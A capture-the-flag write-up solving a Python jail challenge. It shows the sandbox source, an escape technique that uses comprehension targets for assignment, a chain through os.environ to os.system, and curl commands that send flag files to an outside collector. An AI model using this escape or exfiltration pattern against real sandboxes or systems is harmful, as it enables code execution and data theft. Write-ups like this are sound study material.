# The pyjail

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | misc |
| Difficulty | grandpa |
| Author | Hiumee |
| Points at close | 206 |
| Solves | 72 |
| Status | solved |

> pyjail

Files: [`jail.zip`](handout/jail.zip)

<details>
<summary><b>My Solution</b></summary>

We're constrained by a 32-character alphabet with no parentheses and no `=`. The way out of jail is that a list comprehension's `for` target can be an attribute reference or a subscript, which gives you assignment inside an `eval`. `jail.py` writes your bytes to `/app/user_input` and runs `python3 user.py`:
```python
import sys
def idk(a, b, fn):
    fn(a, b)
code = ''.join(c for c in open("user_input").read()
               if c in "abcdefghijklmnopqrstuvwxyz:_.[],")
if "ass" in code or "typ" in code or "als" in code:
    print("Nope")
else:
    eval(code, {"__builtins__": {"idk":idk,"sys":sys}})
```

So you get lowercase letters plus `: _ . [ ] ,`. Still no parens, spaces, digits, quotes, `=`, etc. though. That means we can't do `__class__`, `__subclasses__`, `type` or `__globals__`, and only `sys` plus a decoy `idk` are in scope. But wait! Python keywords don't need whitespace next to a bracket, so you can write a comprehension without spaces. And a comprehension `for` target can be an attribute or a subscript:
```python
[[]for[a.b]in[[v]]]        # same thing as a.b = v
[[]for[a[k]]in[[v]]]       # same thing as a[k] = v
```

Both parse, so we're outta jail! Now for the full exploit, we note that `os._Environ.__setitem__` in python 3.15 is `putenv(self.encodekey(k), self.encodevalue(v))`. But `encodekey` and `encodevalue` are per-instance attributes and `putenv` is a module global, so overwrite all three and `os.environ[k] = v` becomes `f(g(k), h(v))`. Then reach `os` as `sys.modules[<'os'>]`, slicing the two-character string out of a reachable docstring. For the slice bounds you need integers, which come from interpreter constants like `sys.flags.debug` (0), `sys.float_info.radix` (2) and `sys.float_info.dig` (15). Chain `[a:][b:]` for larger offsets, since `s[a:][b:]` is `s[a+b:]`.

First build a string, using `sys.abiflags` (which is `''`, so `.join` is `''.join`) and `sys.intern` (identity on `str`):
```python
os.putenv              = sys.__setattr__
os.environ.encodekey   = sys.intern
os.environ.encodevalue = sys.abiflags.join
os.environ[sys.platform] = [<char slices>]     ->  sys.linux = "<command>"
```

Then run it:
```python
os.environ.encodekey = os.system
os.environ[sys.linux]                          ->  os.system("<command>")
```

You might get a trailing `KeyError` but it doesn't matter since the command already ran.

## Extract the flag
`run.sh` adds `--cap-add=SYS_PTRACE`, and that looks like a tell. [PEP 768](https://peps.python.org/pep-0768/) `sys.remote_exec(pid, script)` takes the same two arguments `idk` forwards. I think this was a trap though. Writing to the client socket directly works locally and can't work remotely since `open("/proc/1/fd/N")` on a socket returns ENXIO for me on Linux (with or without the capability). The child from `os.system` never inherits the socket, because [PEP 446](https://peps.python.org/pep-0446/) makes an `accept()`ed socket non-inheritable and exec closes it. And `sys.remote_exec(1, script)` does work locally, since the capability enables exactly that, but the deployed pod doesn't grant it. Three remote runs returned `Running your code...` and nothing else. I never actually tested ptrace on the pod, so maybe there's some juice we can squeeze there, but what I do know is that `hasattr(sys,"remote_exec")` can't test capability since python 3.15 builds it in regardless. The real gate would be `ptrace_may_access` at attach time.

But wait, we had `curl` inside of the Dockerfile (pre-installed) the whole time lol.
```sh
curl -sk <collector>/pjalive
cat /flag* /*flag* >/tmp/f 2>&1
curl -sk --data-binary @/tmp/f <collector>/pjflag
```

Then you get 8428 bytes of expression, but firing a harmless marker on a separate path in the same command makes the result readable (if the marker lands then egress works).

Flag: `TFCCTF{i_hope_this_is_not_the_last_jail}`
</details>
